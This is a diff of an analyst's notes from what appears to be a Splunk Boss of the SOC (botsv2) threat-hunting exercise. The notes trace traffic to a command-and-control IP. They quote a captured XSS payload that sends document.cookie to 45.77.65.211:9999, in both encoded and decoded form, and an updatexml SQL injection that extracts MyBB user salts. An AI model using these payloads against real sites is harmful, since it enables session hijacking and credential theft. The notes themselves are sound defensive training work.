@@ -1047,9 +1047,11 @@ Taking a look at firewall destined to C2 45.77.65.211
 ```
 sourcetype="pan:traffic" dest_ip=45.77.65.211
 | stats count by src_ip dest_port action app
+```
 
-Output shows 2 interesting on port 9999 which are highly unusual port, from host growler, but only 2 30seconds apart. But not relevant to finding beaconing source. Interesting but irrelevant.
-
+```
+HTTP logs = only unencrypted web traffic
+PAN logs  = all traffic (why blow is port 443 and 9999)
 src_ip	    dest_port	 action	       app	          count
 10.0.1.100	443	         allowed	   ssl	          11086
 10.0.1.101	443	         allowed	   ssl	          9139
@@ -1057,6 +1059,47 @@ src_ip	    dest_port	 action	       app	          count
 10.0.2.109	443	         allowed	   ssl	          11190
 10.0.2.109	9999	     allowed	   web-browsing	  2
 ```
+Output shows 2 interesting on port 9999 which are highly unusual port, from host growler, but only 2 30seconds apart. But not relevant to finding beaconing source. Interesting but irrelevant. using index=botsv2 sourcetype=stream:http 45.77.65.211 dest_port=9999 1 packet showed indicating Python 2.7.12 SimpleHTTP server with. This seems to imply call to c2 from src_ip 10.0.2.109 (Jupitor).
+
+Seems to push to C2 server:
+```
+http_referrer:  http://www.brewertalk.com/member.php?action=activate&uid=-1&code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E
+```
+Unencoded %coded section:
+```
+<script>document.location =
+"http://45.77.65.211:9999/microsoftuserfeedbackservice?metric="
++ document.cookie;</script>
+```   
+Changing scan to dest_port=80 shows what appears to be a lot of traffic to 45.77.65.211 but this seem not not be beaconing purpose. Seem be all from C2 to another internal IP 172.31.4.249, which seems to be more of attack than a on the internal site than beaconing action in place. event log is long but initially connects to send POST packets to www.brewertalk.com/member.php HTTP/1.1, with high frequency 1-3 events per second.
+```
+</head>
+<body>...		<p>MyBB has experienced an internal SQL error and cannot continue.</p><dl>
+<dt>SQL Error:</dt>
+<dd>1105 - XPATH syntax error: ':tXXJNkV1'</dd>
+<dt>Query:</dt>
+<dd>
+			SELECT q.*, s.sid
+			FROM mybb_questionsessions s
+			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
+			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT salt FROM mybb_users ORDER BY UID LIMIT 5,1)),NULL) and '1'
+...</body>
+</html>
+```
+What this is likely doing:
+- Running automated web scans
+- Performing SQL injection attacks
+- Enumerating vulnerable websites
+- In that case the frequent traffic is because the tool is sending a large number of web requests very quickly.
+- Seems more like the C2 is directly attacking the target web server
+- Some malware uses normal web requests to communicate with a C2 server. If that were the case, you'd expect things like:
+- Regular intervals
+- Small POST requests containing host data
+- Encoded parameters 
+- Consistent URI patterns unrelated to user browsing
+- Responses containing commands
+- But these payloads are trying to execute: SQL, SELECT password FROM mybb_users, that is database theft activity, not command retrieval.
+- This might rule out member.php from being the beacon traffic we are looking for as thats a totally different purpose. 
 
 
 
